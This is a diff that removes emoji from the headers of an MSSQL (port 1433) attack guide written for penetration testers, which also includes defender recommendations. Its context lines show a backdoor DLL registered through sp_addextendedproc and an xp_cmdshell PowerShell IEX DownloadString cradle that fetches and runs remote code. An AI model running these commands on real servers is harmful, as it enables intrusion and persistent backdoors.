@@ -1,6 +1,6 @@
 # Port 1433 - MSSQL (Microsoft SQL Server) - Complete Attack Guide
 
-## 📖 Overview
+## Overview
 
 **Protocol**: Microsoft SQL Server
 **Port**: 1433 (default), 1434 (SQL Browser), dynamic ports
@@ -8,7 +8,7 @@
 **Encryption**: Optional (TLS/SSL)
 **Authentication**: Windows, SQL Authentication, Azure AD
 
-## 🎯 Attack Objectives
+## Attack Objectives
 
 - **Credential Brute Force**: Crack SQL Server credentials
 - **Command Execution**: Execute OS commands via xp_cmdshell
@@ -18,7 +18,7 @@
 - **Hash Theft**: Extract NTLM hashes
 - **Backdoor Installation**: Maintain persistent access
 
-## 🔍 Attack Methodology
+## Attack Methodology
 
 ### Phase 1: Discovery and Reconnaissance
 
@@ -388,7 +388,7 @@ SQL> EXEC sp_addextendedproc 'xp_backdoor', 'C:\backdoor.dll';
 SQL> EXEC xp_backdoor;
 ```
 
-## 🛡️ Bypass Techniques
+## Bypass Techniques
 
 ### Bypassing xp_cmdshell Restrictions
 ```bash
@@ -415,7 +415,7 @@ ssh -L 1434:192.168.1.100:1433 user@jumphost
 sqlcmd -S localhost,1434 -U sa -P password
 ```
 
-## 📊 Information Extraction
+## Information Extraction
 
 **Critical Queries**:
 ```sql
@@ -441,7 +441,7 @@ SELECT SYSTEM_USER, USER_NAME();
 EXEC sp_spaceused;
 ```
 
-## 🔐 Security Recommendations
+## Security Recommendations
 
 **For Defenders**:
 1. **Disable sa account** - Use named accounts
@@ -455,7 +455,7 @@ EXEC sp_spaceused;
 9. **Remove TRUSTWORTHY** - On user databases
 10. **Patch Regularly** - Keep SQL Server updated
 
-## 🎯 Practical Attack Scenario
+## Practical Attack Scenario
 
 ```bash
 # Discovery
@@ -488,7 +488,7 @@ SQL> EXEC xp_cmdshell 'powershell IEX(New-Object Net.WebClient).DownloadString("
 # Full system compromise
 ```
 
-## 📚 Tools Summary
+## Tools Summary
 
 **Best Tool for Each Task**:
 - **Discovery**: Nmap
@@ -498,7 +498,7 @@ SQL> EXEC xp_cmdshell 'powershell IEX(New-Object Net.WebClient).DownloadString("
 - **Privilege Escalation**: PowerUpSQL
 - **Hash Cracking**: Hashcat
 
-## 🔗 Related Attacks
+## Related Attacks
 
 - **Port 445 (SMB)**: NTLM hash capture
 - **Port 88 (Kerberos)**: Kerberoasting MSSQL SPNs
